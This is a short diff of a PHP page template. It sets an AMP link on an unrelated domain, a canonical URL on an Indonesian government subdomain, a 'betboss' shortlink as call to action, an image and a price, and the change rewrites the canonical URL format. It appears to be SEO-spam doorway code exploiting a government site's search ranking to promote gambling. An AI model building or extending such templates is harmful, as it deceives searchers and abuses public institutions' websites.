@@ -44,7 +44,7 @@ if (!$found) {
     show404();
 }
 $amphtml = "https://needmariju.top/page/$dashbrand";
-$canonical = "https://kel-semarang.banjarnegarakab.go.id/berita/$dashbrand";
+$canonical = "https://kel-semarang.banjarnegarakab.go.id/page/?post=$dashbrand";
 $cta = "https://t.ly/betboss";
 $gambar = "https://res.cloudinary.com/dyyaa4aug/image/upload/v1729082465/OIG3.D6yR1W8ZA.yDN4Nj16Ew_1_kmawfn.jpg";
 $price = "5000.00";
